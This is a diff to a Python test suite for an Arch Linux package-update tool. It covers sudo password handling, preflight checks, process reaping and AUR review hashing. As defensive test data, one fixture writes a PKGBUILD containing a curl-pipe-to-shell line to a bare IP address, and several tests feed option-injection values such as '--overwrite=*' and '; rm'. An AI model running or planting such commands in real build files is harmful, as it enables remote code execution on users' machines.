@@ -54,13 +54,18 @@ class FakeStdin:
 @pytest.fixture
 def calls(monkeypatch, tmp_path):
     monkeypatch.setattr(config, 'CACHE', tmp_path)
+    monkeypatch.setattr(config, 'CHECKUP_DB', tmp_path / 'checkup-db')
     monkeypatch.setattr(executor.pacman_src, 'db_locked', lambda: False)
     monkeypatch.setattr(executor.pacman_src, 'pacnew_files', lambda: [])
+    monkeypatch.setattr(executor, 'have', lambda tool: True)
+    monkeypatch.setattr(executor, '_free_bytes', lambda path: 100 * 1024 ** 3)
     seen = []
 
     async def fake_exec(*cmd, **kw):
         out = ['Packages (2) a-2-1 b-2-1', ':: Processing package changes...', '(1/2) upgrading a',
                '(2/2) upgrading b', 'warning: /etc/a.conf installed as /etc/a.conf.pacnew']
+        if cmd[:2] in (('pacman', '-Sp'), ('pacman', '-Rsp')) and '--' in cmd:   # Vorabprüfung: Ziele „gefunden“
+            out = list(cmd[cmd.index('--') + 1:])
         proc = FakeProc(out)
         seen.append((list(cmd), proc))
         return proc
@@ -214,7 +219,8 @@ def test_repo_install_runs_full_upgrade_with_needed(calls):
     assert 'Repo' in plan.phases()
     r = asyncio.run(executor.Runner(plan, cbs(log), SECRET, {}).run())
     assert r.ok
-    cmd, proc = calls[0]
+    assert calls[0][0][:2] == ['pacman', '-Sp'] and calls[0][0][-2:] == ['htop', 'python-foo+bar']   # Vorabprüfung
+    cmd, proc = calls[1]
     assert cmd[:6] == ['sudo', '-S', '-k', '-p', '', '--']
     assert cmd[6:] == ['pacman', '-Syu', '--noconfirm', '--noprogressbar', '--needed', 'htop', 'python-foo+bar']
     assert proc.stdin.data == (SECRET + '\n').encode()                 # Passwort nur über stdin
@@ -226,7 +232,7 @@ def test_repo_install_dry_run_has_no_sudo(calls):
     plan = executor.Plan(repo=False, install=['htop'], dry_run=True)
     r = asyncio.run(executor.Runner(plan, cbs([]), None, {}).run())
     assert r.ok and all(c[0] != 'sudo' for c, _ in calls)
-    assert calls[0][0][:2] == ['pacman', '-Sup'] and '--needed' in calls[0][0] and calls[0][0][-1] == 'htop'
+    assert calls[1][0][:2] == ['pacman', '-Sup'] and '--needed' in calls[1][0] and calls[1][0][-1] == 'htop'
 
 
 @pytest.mark.parametrize('field, value', [
@@ -281,11 +287,13 @@ def _aur_env(monkeypatch, tmp_path):
             return '\n'.join(map(str, pkgs))
         if cmd[:2] == ['pacman', '-Qq']:
             return 'bash\nglibc\n'
+        if cmd[:2] == ['pacman', '-Qqn']:
+            return 'bash\nglibc\n'
         if cmd[:2] == ['pacman', '-Qqp']:
-            return 'foo-debug\n' if 'debug' in cmd[2] else 'foo\n'
+            return 'foo-debug\n' if 'debug' in cmd[-1] else 'foo\n'
         raise AssertionError(cmd)
     monkeypatch.setattr(executor, '_run_text', fake_text)
-    pkgs.review_hash = aur_scanner.review_hash([text])      # Fingerabdruck des „geprüften“ PKGBUILD
+    pkgs.review_hash = aur_scanner.review_hash({'PKGBUILD': text}, 'foo')   # Fingerabdruck des „geprüften“ PKGBUILD
     return pkgs
 
 
@@ -295,7 +303,7 @@ def test_aur_new_install_picks_wanted_package(calls, monkeypatch, tmp_path):
     r = asyncio.run(executor.Runner(plan, _cbs_answer([], True, []), SECRET, {}).run())
     assert r.ok and r.updated == ['foo']
     installs = [c for c in _no_sudo_cmds(calls) if c[:2] == ['pacman', '-U']]
-    assert installs == [['pacman', '-U', '--noconfirm', '--noprogressbar', str(pkgs[0])]]   # nur foo, nicht foo-debug
+    assert installs == [['pacman', '-U', '--noconfirm', '--noprogressbar', '--', str(pkgs[0])]]   # nur foo, nicht foo-debug
 
 
 def test_aur_update_of_not_installed_package_is_skipped(calls, monkeypatch, tmp_path):
@@ -325,7 +333,8 @@ def test_remove_runs_pacman_with_sudo_and_stdin_password(calls, configs, flags):
     plan = executor.Plan(repo=False, snapshot=False, remove=['htop', 'btop'], remove_configs=configs)
     r = asyncio.run(executor.Runner(plan, cbs([]), SECRET, {}).run())
     assert r.ok and r.updated == ['Entfernen']
-    cmd, proc = calls[0]
+    assert calls[0][0][:2] == ['pacman', '-Rsp']                   # Vorabprüfung ohne sudo
+    cmd, proc = calls[1]
     assert cmd[:6] == ['sudo', '-S', '-k', '-p', '', '--']
     assert cmd[6:] == ['pacman', flags, '--noconfirm', '--noprogressbar', 'htop', 'btop']
     assert proc.stdin.data == (SECRET + '\n').encode() and all(SECRET not in a for c, _ in calls for a in c)
@@ -379,11 +388,234 @@ def test_aur_review_applies_only_to_the_reviewed_content(calls, monkeypatch, tmp
     text = (tmp_path / 'aur' / 'foo' / 'PKGBUILD').read_text()
     asked = []
     plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], install_aur={'foo'},
-                         reviewed={'foo': aur_scanner.review_hash([text])})
+                         reviewed={'foo': aur_scanner.review_hash({'PKGBUILD': text}, 'foo')})
     r = asyncio.run(executor.Runner(plan, _cbs_answer([], False, asked), SECRET, {}).run())
     assert asked == [] and r.updated == ['foo']
 
 
-def test_review_hash_is_content_based_and_order_independent():
-    assert aur_scanner.review_hash(['a', 'b']) == aur_scanner.review_hash(['b', 'a'])
-    assert aur_scanner.review_hash(['a']) != aur_scanner.review_hash(['a ']) != aur_scanner.review_hash(['a', 'b'])
+def test_review_hash_covers_filenames_content_and_package():
+    h = aur_scanner.review_hash
+    base = h({'PKGBUILD': 'a', 'foo.install': 'b'}, 'foo')
+    assert base == h({'foo.install': 'b', 'PKGBUILD': 'a'}, 'foo')                 # Reihenfolge egal
+    assert base != h({'PKGBUILD': 'a', 'foo.install': 'b '}, 'foo')               # Inhalt
+    assert base != h({'PKGBUILD': 'a', 'bar.install': 'b'}, 'foo')                # Dateiname
+    assert base != h({'PKGBUILD': 'a'}, 'foo')                                    # Datei weggefallen
+    assert base != h({'PKGBUILD': 'a', 'foo.install': 'b'}, 'bar')                # anderes Paket
+    # gleicher Inhalt unter verschiedenen Namen ist unterscheidbar, Grenzen lassen sich nicht verschieben
+    assert h({'PKGBUILD': 'x', 'a.install': 'x'}) != h({'PKGBUILD': 'x', 'b.install': 'x'})
+    assert h({'ab': 'c'}) != h({'a': 'bc'})
+
+
+# ------------------------------------------------------------------ Review 1.5.0: Prozesse, Vorabprüfung, AUR
+
+class HangingProc:
+    """Ein Prozess, der auf SIGTERM nicht reagiert – erst SIGKILL beendet ihn."""
+
+    def __init__(self, ignore_term=True):
+        self.returncode = None
+        self.stdin = FakeStdin()
+        self.stdin.closed = False
+        self.stdin.close = lambda: setattr(self.stdin, 'closed', True)
+        self.signals, self.ignore_term = [], ignore_term
+        self._done = asyncio.Event()
+        self.stdout = self
+
+    async def read(self, n=-1):
+        await self._done.wait()
+        return b''
+
+    def terminate(self):
+        self.signals.append('TERM')
+        if not self.ignore_term:
+            self._exit(-15)
+
+    def kill(self):
+        self.signals.append('KILL')
+        self._exit(-9)
+
+    def _exit(self, rc):
+        self.returncode = rc
+        self._done.set()
+
+    async def wait(self):
+        await self._done.wait()
+        return self.returncode
+
+    async def communicate(self, data=None):
+        await self._done.wait()
+        return b'', b''
+
+
+def test_check_password_timeout_kills_and_reaps_sudo(monkeypatch):
+    proc = HangingProc()
+
+    async def fake_exec(*cmd, **kw):
+        return proc
+    monkeypatch.setattr(asyncio, 'create_subprocess_exec', fake_exec)
+    monkeypatch.setattr(executor, 'TERM_GRACE', 0.05)
+    assert asyncio.run(executor.check_password(SECRET, timeout=0.05)) is False
+    assert proc.signals == ['TERM', 'KILL'] and proc.returncode == -9 and proc.stdin.closed
+
+
+def test_reap_stops_after_term_when_process_exits():
+    proc = HangingProc(ignore_term=False)
+    asyncio.run(executor._reap(proc, grace=1))
+    assert proc.signals == ['TERM'] and proc.returncode == -15
+
+
+def test_stream_timeout_returns_124_and_reaps(calls, monkeypatch):
+    procs = []
+
+    async def fake_exec(*cmd, **kw):
+        procs.append(HangingProc())
+        return procs[-1]
+    monkeypatch.setattr(asyncio, 'create_subprocess_exec', fake_exec)
+    monkeypatch.setattr(executor, 'TERM_GRACE', 0.05)
+    log = []
+    runner = executor.Runner(executor.Plan(repo=False, snapshot=False), cbs(log), None, {})
+
+    async def go():
+        return await runner._stream(['git', 'clone', 'x'], timeout=0.05)
+    assert asyncio.run(go()) == 124
+    assert procs[0].returncode is not None and any('Zeitlimit' in line for line in log)
+
+
+def test_stream_cancellation_reaps_child(calls, monkeypatch):
+    procs = []
+
+    async def fake_exec(*cmd, **kw):
+        procs.append(HangingProc(ignore_term=False))
+        return procs[-1]
+    monkeypatch.setattr(asyncio, 'create_subprocess_exec', fake_exec)
+    runner = executor.Runner(executor.Plan(repo=False, snapshot=False), cbs([]), None, {})
+
+    async def go():
+        task = asyncio.create_task(runner._stream(['makepkg']))
+        await asyncio.sleep(0.01)
+        task.cancel()
+        with pytest.raises(asyncio.CancelledError):
+            await task
+    asyncio.run(go())
+    assert procs[0].signals == ['TERM'] and procs[0].returncode == -15
+
+
+@pytest.mark.parametrize('chunk', [1, 2, 3, 4, 5, 7])
+def test_read_lines_crlf_across_chunk_boundaries(chunk):
+    async def go():
+        return [x async for x in executor._read_lines(FakeStream(b'ab\r\ncd\r\n\r\nef\rgh\r', chunk=chunk))]
+    assert asyncio.run(go()) == [b'ab', b'cd', b'', b'ef', b'gh']
+
+
+def test_parse_srcinfo_deps_keeps_constraints_and_rejects_options():
+    srcinfo = ('pkgbase = foo\n\tmakedepends = cmake\n\tdepends = glibc>=2.38\n\tdepends_x86_64 = lib32-foo\n'
+               '\tcheckdepends = python-pytest\n\toptdepends = bar: optional\npkgname = foo-cli\n\tdepends = \n'
+               '\tdepends = glibc>=2.38\n')
+    assert executor.parse_srcinfo_deps(srcinfo) == ['cmake', 'glibc>=2.38', 'lib32-foo', 'python-pytest']
+    for bad in ('--overwrite=*', 'foo bar', '-Rdd', 'foo>=1 ; rm'):
+        with pytest.raises(executor._Skip):
+            executor.parse_srcinfo_deps(f'\tdepends = {bad}\n')
+
+
+def test_aur_dependency_option_injection_never_reaches_sudo(calls, monkeypatch, tmp_path):
+    pkgs = _aur_env(monkeypatch, tmp_path)
+    inner = executor._run_text
+
+    def fake_text(cmd, cwd, ok=(0,), env=None):
+        if cmd[:2] == ['makepkg', '--printsrcinfo']:
+            return 'pkgbase = foo\n\tdepends = --overwrite=*\n'
+        return inner(cmd, cwd, ok, env)
+    monkeypatch.setattr(executor, '_run_text', fake_text)
+    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], install_aur={'foo'},
+                         reviewed={'foo': pkgs.review_hash})
+    r = asyncio.run(executor.Runner(plan, _cbs_answer([], True, []), SECRET, {}).run())
+    assert r.skipped == ['foo'] and _no_sudo_cmds(calls) == []
+
+
+def test_aur_artifact_replacing_repo_package_is_rejected(calls, monkeypatch, tmp_path):
+    pkgs = _aur_env(monkeypatch, tmp_path)
+    inner = executor._run_text
+
+    def fake_text(cmd, cwd, ok=(0,), env=None):
+        if cmd[:2] == ['pacman', '-Qqp'] and 'debug' in cmd[-1]:
+            return 'glibc\n'                                  # Split-Artefakt gibt sich als Repo-Paket aus
+        return inner(cmd, cwd, ok, env)
+    monkeypatch.setattr(executor, '_run_text', fake_text)
+    log = []
+    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], install_aur={'foo'},
+                         reviewed={'foo': pkgs.review_hash})
+    r = asyncio.run(executor.Runner(plan, _cbs_answer(log, True, []), SECRET, {}).run())
+    assert r.skipped == ['foo'] and not any(c[:2] == ['pacman', '-U'] for c in _no_sudo_cmds(calls))
+    assert any('glibc' in line and 'Repos' in line for line in log)
+
+
+def test_aur_update_installs_only_planned_split_packages_and_builds_once(calls, monkeypatch, tmp_path):
+    pkgs = _aur_env(monkeypatch, tmp_path)
+    inner = executor._run_text
+    built = []
+
+    def fake_text(cmd, cwd, ok=(0,), env=None):
+        if cmd[:2] == ['pacman', '-Qq']:
+            return 'bash\nfoo\nfoo-debug\n'
+        if cmd[:2] == ['makepkg', '--packagelist']:
+            built.append(cwd)
+        return inner(cmd, cwd, ok, env)
+    monkeypatch.setattr(executor, '_run_text', fake_text)
+    # nur foo ist geplant: foo-debug ist installiert, wird aber nicht mit aktualisiert
+    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], reviewed={'foo': pkgs.review_hash})
+    r = asyncio.run(executor.Runner(plan, _cbs_answer([], True, []), SECRET, {}).run())
+    assert r.updated == ['foo']
+    assert next(c for c in _no_sudo_cmds(calls) if c[:2] == ['pacman', '-U'])[-1] == str(pkgs[0])
+    # beide geplant: ein Build, beide installiert
+    calls.clear(), built.clear()
+    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo'), ('foo-debug', 'foo')],
+                         reviewed={'foo': pkgs.review_hash})
+    r = asyncio.run(executor.Runner(plan, _cbs_answer([], True, []), SECRET, {}).run())
+    assert r.updated == ['foo', 'foo-debug'] and len(built) == 1
+    assert sorted(next(c for c in _no_sudo_cmds(calls) if c[:2] == ['pacman', '-U'])[-2:]) == sorted(map(str, pkgs))
+
+
+def test_aur_unreferenced_install_file_invalidates_approval(calls, monkeypatch, tmp_path):
+    _aur_env(monkeypatch, tmp_path)
+    d = tmp_path / 'aur' / 'foo'
+    (d / 'PKGBUILD').write_text("pkgname=foo\ncurl -s http://1.2.3.4/x | sh\n")
+    text = (d / 'PKGBUILD').read_text()
+    (d / 'evil.install').write_text('post_install() { :; }\n')
+    asked = []
+    plan = executor.Plan(repo=False, snapshot=False, aur=[('foo', 'foo')], install_aur={'foo'},
+                         reviewed={'foo': aur_scanner.review_hash({'PKGBUILD': text}, 'foo')})
+    asyncio.run(executor.Runner(plan, _cbs_answer([], False, asked), SECRET, {}).run())
+    assert asked                                             # Freigabe deckt die zusätzliche Datei nicht ab
+
+
+def _sudo_calls(calls):
+    return [c for c, _ in calls if c[0] == 'sudo']
+
+
+def test_preflight_missing_repo_package_aborts_before_any_change(calls, monkeypatch):
+    async def fake_exec(*cmd, **kw):
+        calls.append((list(cmd), None))
+        return FakeProc(['htop'] if cmd[:2] == ('pacman', '-Sp') else [])
+    monkeypatch.setattr(asyncio, 'create_subprocess_exec', fake_exec)
+    plan = executor.Plan(repo=False, install=['htop', 'nosuchpkg'], snapshot=True)
+    r = asyncio.run(executor.Runner(plan, cbs([]), SECRET, {'snapper': True}).run())
+    assert not r.ok and 'nosuchpkg' in r.errors[0] and _sudo_calls(calls) == []
+
+
+def test_preflight_broken_removal_aborts_before_repo_update(calls, monkeypatch):
+    async def fake_exec(*cmd, **kw):
+        calls.append((list(cmd), None))
+        return FakeProc([":: removing glibc breaks dependency 'glibc' required by zstd"])
+    monkeypatch.setattr(asyncio, 'create_subprocess_exec', fake_exec)
+    plan = executor.Plan(repo=True, remove=['glibc'], snapshot=True)
+    r = asyncio.run(executor.Runner(plan, cbs([]), SECRET, {'snapper': True}).run())
+    assert not r.ok and 'zstd' in r.errors[0] and _sudo_calls(calls) == []
+
+
+def test_preflight_disk_space_and_tools(calls, monkeypatch):
+    monkeypatch.setattr(executor, '_free_bytes', lambda path: 10 * 1024 ** 2)
+    r = asyncio.run(executor.Runner(executor.Plan(repo=True), cbs([]), SECRET, {}).run())
+    assert not r.ok and 'freier Speicher' in r.errors[0] and calls == []
+    monkeypatch.setattr(executor, '_free_bytes', lambda path: 100 * 1024 ** 3)
+    monkeypatch.setattr(executor, 'have', lambda tool: tool != 'makepkg')
+    r = asyncio.run(executor.Runner(executor.Plan(repo=True, aur=[('foo', 'foo')]), cbs([]), SECRET, {}).run())
+    assert not r.ok and 'makepkg' in r.errors[0] and calls == []
